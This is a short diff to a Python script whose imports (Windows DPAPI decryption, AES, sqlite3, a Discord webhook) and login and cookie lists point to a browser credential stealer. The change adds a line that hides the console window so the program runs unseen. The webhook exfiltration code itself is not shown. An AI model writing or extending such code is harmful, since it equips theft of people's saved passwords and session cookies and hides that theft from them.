@@ -3,12 +3,15 @@ import json
 import os
 import shutil
 import sqlite3
+import ctypes
 from pathlib import Path
 from zipfile import ZipFile
 
 from Crypto.Cipher import AES
 from discord import Embed, File, SyncWebhook
 from win32crypt import CryptUnprotectData
+
+user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
 
 __LOGINS__ = []
 __COOKIES__ = []
